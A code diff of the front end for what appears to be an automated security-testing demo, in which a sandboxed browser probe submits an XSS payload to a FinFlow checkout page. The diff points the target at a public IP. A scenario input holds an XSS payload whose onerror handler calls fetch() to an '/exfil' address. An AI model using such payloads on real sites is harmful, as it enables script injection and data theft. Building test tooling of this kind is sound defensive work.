@@ -200,7 +200,7 @@
             <label for="targetUrlInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">
               Target Staging URL (Sandboxed Ingress)
             </label>
-            <input id="targetUrlInput" type="text" value="https://staging-finflow.vultr-demo.internal/checkout" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl px-3.5 py-2 text-sm text-cyan-300 mono focus:outline-none focus:border-vultr-400" />
+            <input id="targetUrlInput" type="text" value="http://64.177.42.65:5000/checkout" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl px-3.5 py-2 text-sm text-cyan-300 mono focus:outline-none focus:border-vultr-400" />
           </div>
           <div class="lg:col-span-3">
             <label for="auditGoalInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">
@@ -784,10 +784,10 @@ cd backend &amp;&amp; nohup python3 -m uvicorn main:app --host 0.0.0.0 --port 80
         <div class="border-b border-slate-800 pb-3">
           <span class="text-xs font-bold uppercase tracking-wider text-vultr-400">Pattern B · Real Browser Probe</span>
           <h2 class="text-lg font-extrabold text-white mt-0.5">Browser Lab — Playwright in an Isolated Container</h2>
-          <p class="text-xs text-slate-400 mt-1">A real Chromium browser inside a Docker container on its own network loads the FinFlow checkout, fills the promo field with an XSS payload, submits it, and reports whether the payload was reflected unescaped. Screenshot + DOM snippet + SHA-256 receipt.</p>
+          <p class="text-xs text-slate-400 mt-1">A real Chromium browser inside a Docker container on its own network loads the FinFlow checkout, fills the promo field with an XSS payload, submits it, and reports whether the payload was reflected unescaped. Screenshot + DOM snippet + SHA-256 receipt. The target is a real Flask app, visitable at http://64.177.42.65:5000/checkout — the probe reaches it from its isolated container network.</p>
         </div>
         <div class="flex flex-wrap gap-2 items-center">
-          <input id="browserTargetInput" class="flex-1 min-w-[280px] bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs mono text-slate-200" value="http://aegisqa-browser-target:5000/checkout">
+          <input id="browserTargetInput" class="flex-1 min-w-[280px] bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs mono text-slate-200" value="http://64.177.42.65:5000/checkout">
           <button onclick="runBrowserProbe()" class="bg-gradient-to-r from-vultr-500 to-cyan-500 text-slate-950 font-bold text-sm py-2 px-4 rounded-xl">Run Browser Probe</button>
         </div>
         <pre id="browserProbeOutput" class="bg-slate-900/95 border border-slate-800 rounded-lg p-3 text-xs mono overflow-x-auto max-h-96 leading-relaxed text-slate-200">No browser probe yet. Click "Run Browser Probe".</pre>
@@ -912,7 +912,7 @@ cd backend &amp;&amp; nohup python3 -m uvicorn main:app --host 0.0.0.0 --port 80
 
     const SCENARIOS = {
       finflow: {
-        url: 'https://staging-finflow.vultr-demo.internal/checkout',
+        url: 'http://64.177.42.65:5000/checkout',
         goal: 'Test sandbox air-gap, verify code execution, mint SHA-256 receipt',
         appTitle: 'FinFlow Enterprise Checkout v2.4',
         input1: "<img src=x onerror=fetch('http://10.0.0.1/exfil')>",
